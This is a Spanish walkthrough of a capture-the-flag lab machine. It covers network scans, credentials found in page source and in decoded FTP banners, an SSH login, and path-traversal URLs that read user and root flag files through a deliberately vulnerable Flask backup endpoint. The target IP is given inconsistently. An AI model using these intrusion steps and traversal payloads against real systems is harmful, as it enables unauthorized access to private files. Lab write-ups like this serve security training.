```
 _______         __       _____  ___    _____  ___     _______    _______   
|   _  "\       /""\     (\"   \|"  \  (\"   \|"  \   /"     "|  /"      \  
(. |_)  :)     /    \    |.\\   \    | |.\\   \    | (: ______) |:        | 
|:     \/     /' /\  \   |: \.   \\  | |: \.   \\  |  \/    |   |_____/   ) 
(|  _  \\    //  __'  \  |.  \    \. | |.  \    \. |  // ___)_   //      /  
|: |_)  :)  /   /  \\  \ |    \    \ | |    \    \ | (:      "| |:  __   \  
(_______/  (___/    \___) \___|\____\)  \___|\____\)  \_______) |__|  \___)    
```
# Reconocimiento

Identificar la IP de la maquina victima

```bash
arp-scan -I eth0 --localnet
```

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 10.20.2.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.20.2.1       52:54:00:12:35:00       QEMU
10.20.2.2       52:54:00:12:35:00       QEMU
10.20.2.3       08:00:27:60:52:d0       PCS Systemtechnik GmbH
10.20.2.13      08:00:27:7f:5a:17       PCS Systemtechnik GmbH
```

Enviamos `ping` a 10.20.2.13 para ver si es el objetivo

```bash
ping -c 1 10.20.2.13 -R
```

```
PING 10.20.2.13 (10.20.2.13) 56(124) bytes of data.
64 bytes from 10.20.2.13: icmp_seq=1 ttl=64 time=0.705 ms
RR:     10.20.2.10
        10.20.2.13
        10.20.2.13
        10.20.2.10

--- 10.20.2.13 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

Vemos que devuelve un `TTL=64` estamos ante un posible sistema operativo Linux, realicemos ahora un escaneo con `nmap` para confirmar.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.20.2.13 -oG allPorts
```

```
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```
# Enumeración

Bien de la salida anterior vemos que existen tres puertos abiertos: `21,22,8080`, con servicios `ftp,ssh,http`, ejecutándose en ellos respectivamente, realicemos un escaneo dirigido a estos puertos para enumerar la mayor cantidad de información posible.

```bash
nmap -sCV -sS -p 21,22,8080 10.20.2.13 -oN target.txt
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8080/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.9.2)
|_http-server-header: Werkzeug/3.1.6 Python/3.9.2
|_http-title: \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE7\x9F\xA5\xE8\xAF\x86\xE6\x8C\x91\xE6\x88\x98
MAC Address: 08:00:27:7F:5A:17 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Un recurso que debemos revisar es el servicio web ejecutándose en el puerto 8080. Podemos revisar el navegador para ver si encontramos más pistas.

![](media/Pasted_image_20260923160654.png)

Obtenemos este portal, al parecer esta en otro idioma, lo que podemos hacer es inspeccionar el código de la página para tratar de buscar pistas en comentarios o secciones ocultas. 

```html
<!-- 弹窗显示flag --> 
<div id="flagModal" class="flag-modal"> 
	<div class="flag-content"> 
		<h2>🎉 恭喜你！</h2> 
		<div class="congrats">分数达到 1000 分！</div> 
		<div>这是你需要的信息：</div> 
		<div class="flag-text" id="flagText">111:banner</div> 
		<button class="close-btn" onclick="closeFlagModal()">关闭</button> 
	</div> 
</div>
```

Encontramos este bloque completo que parece hacer referencia a la `flag`, y en especifico la línea de código `<div class="flag-text" id="flagText">111:banner</div>`, nos indica otras posibles credenciales, podemos intentar con estas para el servicio ftp anterior.

| usuario | contraseña |
| ------- | ---------- |
| 111     | banner     |
```bash
ftp 10.20.2.11
```

```
Name (10.20.2.11:kali): 111
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Hemos logrado establecer conexión remota con e servidor ftp. Si listamos los archivos encontramos un archivo con el nombre `hint`, que parece ser una pista:

```bash
ls
229 Entering Extended Passive Mode (|||21468|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           31 Mar 18  2026 hint
226 Directory send OK.
```

Leemos el archivo para ver si en realidad tiene una pista o solo es una distracción.

```bash
ftp> get hint -
remote: hint
229 Entering Extended Passive Mode (|||61905|)
150 Opening BINARY mode data connection for hint (31 bytes).
你知道什么是banner吗？
```

El contenido del archivo es: <mark>你知道什么是banner吗？</mark>, que al traducirlo obtenemos:

```
Do you know what a banner is?
```

Aparentemente puede parecer que no nos dice nada, sin embargo recordemos que al tratar de iniciar vía `ftp` se muestra un banner de la siguiente forma.

```bash
ftp 10.20.2.13
Connected to 10.20.2.13.
220-Elephants          :                       Mice
220-      / _ )`.
220-     /  _ )^ )`.  .----.
220-    ( _, ' \ ^-)"''     \ \
220-          | |           | | \
220-          | |           | |  |
220-         /  \ /----' \  ( \  (
220-        <  ,"||      \  \ \  \
220-         \\\\ (      ) ) ) ) )
220-          || \      | | / /
220-          ||  \     | |-'
220-              |     |
220-
220-          |     |
220-
220-
220-Carefully observe the changes in the information above.
220 
```

```bash
ftp 10.20.2.13
Connected to 10.20.2.13.
220-Amazing            Zebras                 Eat
220-      / _ )`.
220-     /  _ )^ )`.  .----.
220-    ( _, ' \ ^-)"''     \ \
220-          | |           | | \
220-          | |           | |  |
220-         /  \ /----' \  ( \  (
220-        <  ,"||      \  \ \  \
220-         \\\\ (      ) ) ) ) )
220-          || \      | | / /
220-          ||  \     | |-'
220-              |     |
220-
220-          |     |
220-
220-
220-Carefully observe the changes in the information above.
220 
```

De aquí podemos deducir algo, cada que tratamos de acceder se muestra un Banner diferente, y lo mas interesante es el mensaje al final: `Carefully observe the changes in the information above.`, si se pone atención se notará que en la primer línea existen palabras que cambian, vamos a generar un pequeño script que intente hacer la conexión y que extraiga ese texto que cambia del Banner.

```bash
for i in {1..200}; do 
    timeout 0.2 nc 10.20.2.13 21 | head -n 1 | sed 's/220-//' | tr -cd '[:alpha:][:space:]:' | sed 's/^ *//;s/ *$//' >> palabras_capturadas.txt
done
```

Esto trata de hacer una conexión 200 veces y guarda el texto cambiante de la primer lineal del banner en un archivo de texto llamado `palabras_capturadas.txt`

```
-rw-r--r-- 1 root root   460 Sep 23 16:07 allPorts
-rw-r--r-- 1 root root 21486 Sep 23 17:05 palabras_capturadas.txt
-rw-r--r-- 1 root root  1070 Sep 23 16:06 target.txt
```

Seguramente si analizamos el archivo con `cat`, habrá muchas salidas repetidas, con el siguiente comando vamos a eliminar todo el texto duplicado.

```bash
sed -E 's/\bm([A-Z])/\1/g; s/([a-z])m\b/\1/g; s/\bm:m\b/:/g; s/\bmm\b//g' palabras_capturadas.txt | uniq > palabras_unicas.txt
```

Este comando elimina el contenido duplicado y crea el archivo `palabras_unicas.txt`.

```
-rw-r--r-- 1 root root   460 Sep 23 16:07 allPorts
-rw-r--r-- 1 root root 21486 Sep 23 17:05 palabras_capturadas.txt
-rw-r--r-- 1 root root   392 Sep 23 17:10 palabras_unicas.txt
-rw-r--r-- 1 root root  1070 Sep 23 16:06 target.txt
```

Este archivo debería mostrar algo similar a esto

```
Amazing            Zebras                 Eat
Clever             Owls                    Make
Elephants          :                       Mice
Wild               Elephants               Love
Snakes             Eat                   Crickets
```

Ahora vamos a extraer solo las letras mayúsculas y símbolos

```bash
tr -cd '[:upper:]:' < palabras_unicas.txt > mayusculas_clave.txt
```

Esto además crea el archivo `mayusculas_clave.txt` y si lo leemos con `cat`, obtenemos.

```
AZECOME:MWELSEC
```

En este punto hemos terminado el procesamiento de información del banner, lo único que falta es ver si con lo que tenemos, podemos obtener palabras reconocibles, quedando de la siguiente forma.

```
WELCOME:MAZESEC
```
# Acceso

La palabra `WELCOME` es obvia, hay que probar si el orden del lado derecho de los dos puntos sirve de algo, o se busca otra combinación, esto lo podemos tomar como `usuario:contraseña`, si recapitulamos tenemos un servicio `ssh` ejecutándose, podemos probar suerte en la conexión remota.

| Usuario | contraseña |
| ------- | ---------- |
| welcome | mazesec    |
```bash
ssh welcome@10.20.2.13
```

```
Linux Banner 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr  8 10:09:46 2026
welcome@Banner:~$
```

Bien ya obtuvimos acceso remoto. Hacemos lo habitual, obtener ruta a la que se accedió, tipo de usuario y listado de archivos y directorios.

```bash
pwd
/home/welcome
```

```bash
id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

```bash
ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 Mar 18  2026 .
drwxr-xr-x 4 root    root    4096 Mar 18  2026 ..
lrwxrwxrwx 1 root    root       9 Mar 18  2026 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
-rw-r--r-- 1 root    root      44 Mar 18  2026 user.txt
lrwxrwxrwx 1 root    root       9 Mar 18  2026 .viminfo -> /dev/null
```

Al parecer de este acceso obtenemos uno de los archivos que buscamos, ahora es momento de ver como se puede escalar privilegios ya que `id` nos arrojo que el usuario actual no tiene permisos de `root`, no sin antes revisar <mark>user.txt</mark>.

Para escalar privilegios podemos buscar en carpetas donde normalmente hay movimiento, por ejemplo `/opt`, para ver si se han instalado aplicaciones de terceros que puedan ser vulnerables.

```bash
ls -la /opt
```

```
drwxr-xr-x  3 root root 4096 Mar 17  2026 .
drwxr-xr-x 18 root root 4096 Mar 18  2025 ..
drwxr-xr-x  7 root root 4096 Mar 17  2026 ctf-game
```

Existe un único directorio de nombre `ctf-game`, podemos listarlo para ver su contenido.

```bash
ls -la /opt/ctf-game/
```

```
drwxr-xr-x 7 root root  4096 Mar 17  2026 .
drwxr-xr-x 3 root root  4096 Mar 17  2026 ..
drwxrwxrwx 2 root root  4096 Sep 23 23:57 data
-rwxr-xr-x 1 root root  4044 Mar 17  2026 deploy.sh
drwxr-xr-x 2 root root  4096 Mar 17  2026 logs
-rwxr-xr-x 1 root root 24228 Mar 17  2026 main.py
-rwxr-xr-x 1 root root  1064 Mar 17  2026 start.sh
drwxr-xr-x 2 root root  4096 Mar 17  2026 static
drwxr-xr-x 2 root root  4096 Mar 17  2026 templates
drwxrwxrwx 2 root root  4096 Mar 17  2026 uploads
```

De esta lista podemos ver el contenido del archivo `main.py`, para ver que tipo de aplicación es y ver si se encuentra alguna mala configuración.

```bash
cat /opt/ctf-game/main.py
```

Des este archivo podemos ver que es una aplicación `Flask`, e interesa particularmente el siguiente segmento.

```
...
# 打印API端点
logger.info("可用的API端点:")
logger.info("  GET  /                    - 游戏主界面")
logger.info("  GET  /api/questions       - 获取题目列表")
logger.info("  POST /api/submit          - 提交答案 (漏洞)")
logger.info("  GET  /api/score?user=IP   - 获取分数 (SQL注入)")
logger.info("  POST /api/admin/update    - 管理员接口 (弱口令)")
logger.info("  GET  /api/debug           - 调试信息 (信息泄露)")
logger.info("  POST /api/upload          - 文件上传 (漏洞)")
logger.info("  POST /api/serialize       - 序列化接口 (Pickle漏洞)")
logger.info("  GET  /api/backup?file=    - 备份功能 (路径遍历)")
logger.info("  GET  /api/stats           - 统计信息")
logger.info("  GET  /api/health          - 健康检查")
logger.info("  POST /api/reset           - 手动重置所有数据")
...
```

Vemos que la API tiene un `endpoint` que acepta un archivo como parámetro y no tiene ninguna restricción esto permite aprovechar la vulnerabilidad **Path Traversal**, la cual es un fallo de seguridad que permite a un atacante **leer archivos arbitrarios del servidor** que originalmente deberían estar protegidos y fuera de su alcance.

Ya sabemos que existe user.txt en la sesión del usuario `welcome` y `hint` en la sesión del usuario `ftpuser111`, tratemos de leer este desde el navegador.

```
http://10.20.2.11:8080/api/backup?file=../../../../../../home/ftpuser111/hint
```

```
你知道什么是banner吗？
```
 
Se lee de forma exitosa, lo mismo ocurrirá entonces con:

```
http://10.20.2.11:8080/api/backup?file=../../../../../../home/welcome/user.txt
```

```
http://10.20.2.11:8080/api/backup?file=../../../../../../root/root.txt
```

# Conclusiones

En esta maquina no se tuvo que realizar la escalada de privilegios para poder encontrar las dos banderas ocultas ya que el Path Traversal permitió leer archivos de los usuarios existentes y el archivo de interés de la sesión `root`. 

